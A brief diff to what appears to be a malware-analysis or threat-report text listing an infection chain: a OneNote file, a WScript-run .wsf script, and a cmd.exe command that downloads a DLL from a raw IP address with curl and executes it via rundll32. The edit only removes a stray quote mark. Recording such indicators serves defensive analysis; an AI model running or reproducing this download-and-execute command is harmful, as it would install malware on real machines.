@@ -14,7 +14,7 @@ ONENOTE.EXE C:\Users\Admin\AppData\Local\Temp\item.one
 
 WScript.exe C:\Users\Admin\AppData\Local\Temp\Open.wsf
 
-cmd.exe" /c curl -o fd.dll http://64.225.8.202/1Moch7/160223 && rundll32 fd.dll,N115
+cmd.exe /c curl -o fd.dll http://64.225.8.202/1Moch7/160223 && rundll32 fd.dll,N115
 
 *************************************************
 
